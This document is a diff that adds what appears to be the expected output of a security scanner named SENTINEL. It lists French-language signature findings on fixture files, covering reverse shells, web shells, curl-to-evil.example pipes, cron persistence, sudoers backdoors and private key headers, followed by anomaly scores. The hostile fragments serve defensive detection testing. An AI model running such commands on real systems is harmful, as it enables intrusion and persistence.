@@ -1,0 +1,132 @@
+SENTINEL
+overall_severity: critical
+severity_counts: critical=12 high=20 medium=6 low=0
+integrity_counts: added=0 removed=0 modified=0 mode_changed=0
+
+findings:
+[medium] SIG-0009 inject.sh:1
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: $(curl
+[medium] SIG-0009 inject.sh:2
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: `wget
+[medium] SIG-0009 inject.sh:3
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: ;rm -rf
+[medium] SIG-0009 inject.sh:4
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: && curl
+[critical] SIG-0012 jndi.txt:1
+  Log4Shell : lookup ${jndi:
+  evidence: ${jndi:
+[critical] SIG-0001 webshell.php:2
+  Web shell PHP : eval, base64_decode ou commande shell sur une entrée HTTP
+  evidence: eval(base64_decode(
+[critical] SIG-0008 id_rsa:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN RSA PRIVATE KEY-----
+[high] SIG-0014 .bashrc:1
+  Persistance shell dans .bashrc, .profile, .zshrc ou .bash_profile
+  evidence: wget
+[medium] SIG-0010 headers.txt:2
+  User-Agent d'outil d'attaque ou de client scripté
+  evidence: User-Agent: sqlmap/1.7
+[critical] SIG-0008 openssh_key:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN OPENSSH PRIVATE KEY-----
+[medium] SIG-0016 ld_preload.sh:1
+  LD_PRELOAD ou LD_LIBRARY_PATH pointant vers /tmp
+  evidence: LD_PRELOAD=/tmp/evil.so
+[high] SIG-0007 authorized_keys:1
+  Clé SSH publique ajoutée dans authorized_keys
+  evidence: ssh-ed25519
+[high] SIG-0007 authorized_keys:2
+  Clé SSH publique ajoutée dans authorized_keys
+  evidence: ssh-rsa
+[critical] SIG-0008 ec_private.pem:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN EC PRIVATE KEY-----
+[high] SIG-0004 encoded.txt:1
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: base64 -d payload.b64 | sh
+[high] SIG-0004 encoded.txt:2
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: eval(atob(
+[high] SIG-0004 encoded.txt:3
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: powershell -enc
+[critical] SIG-0001 bad_utf8.php:1
+  Web shell PHP : eval, base64_decode ou commande shell sur une entrée HTTP
+  evidence: eval(base64_decode(
+[high] SIG-0015 sudoers:1
+  Modification d'identités (passwd :0:0: ou sudoers NOPASSWD / ALL=(ALL))
+  evidence: NOPASSWD: ALL
+[high] SIG-0003 crontab.txt:1
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: l http://evil.example/a | sh
+[high] SIG-0003 crontab.txt:2
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: - http://evil.example/b | bash
+[high] SIG-0006 crontab.txt:1
+  Persistance cron (@reboot, ou cinq champs * ou */N, avec curl, wget ou nc)
+  evidence: @reboot
+[high] SIG-0006 crontab.txt:2
+  Persistance cron (@reboot, ou cinq champs * ou */N, avec curl, wget ou nc)
+  evidence: wget
+[critical] SIG-0011 webshell.jsp:1
+  Web shell JSP/ASP (Runtime.exec, Execute ou eval request dans un bloc <% )
+  evidence: <% Runtime.getRuntime().exec(
+[high] SIG-0003 download.sh:1
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: L http://evil.example/x | sh
+[high] SIG-0003 download.sh:2
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: - http://evil.example/x | bash
+[high] SIG-0003 download.sh:3
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: python -c 'import urllib; exec(
+[critical] SIG-0008 pkcs8.pem:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN PRIVATE KEY-----
+[critical] SIG-0002 reverse.sh:1
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: bash -i
+[critical] SIG-0002 reverse.sh:2
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: nc -e
+[critical] SIG-0002 reverse.sh:3
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: ncat
+[critical] SIG-0002 reverse.sh:4
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: socat tcp-listen:4444,reuseaddr exec
+[high] SIG-0015 passwd:1
+  Modification d'identités (passwd :0:0: ou sudoers NOPASSWD / ALL=(ALL))
+  evidence: backdoor uid=0
+[high] SIG-0005 miner.conf:1
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: stratum+tcp
+[high] SIG-0005 miner.conf:2
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: xmrig
+[high] SIG-0005 miner.conf:3
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: minerd
+[high] SIG-0013 .htaccess:1
+  Directive .htaccess dangereuse (auto_prepend ou AddType PHP)
+  evidence: php_value auto_prepend_file
+[high] SIG-0013 .htaccess:2
+  Directive .htaccess dangereuse (auto_prepend ou AddType PHP)
+  evidence: AddType application/x-httpd-php
+
+anomalies : autoencodeur neuronal (V3, score = MSE reconstruit × 100)
+- jndi.txt score=100 — entropy=4.941883, max_line_len=127, nonprintable_ratio=0.0, shell_metachar_ratio=0.0234375, avg_line_len=127.0
+- authorized_keys score=100 — entropy=4.826227, max_line_len=77, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=76.0
+- webshell.jsp score=81 — entropy=4.365430, max_line_len=61, nonprintable_ratio=0.0, shell_metachar_ratio=0.14516129032258066, avg_line_len=61.0
+- sudoers score=64 — entropy=4.066677, max_line_len=32, nonprintable_ratio=0.0, shell_metachar_ratio=0.06060606060606061, avg_line_len=32.0
+
+integrity:
+added: (aucun)
+removed: (aucun)
+modified: (aucun)
+mode_changed: (aucun)
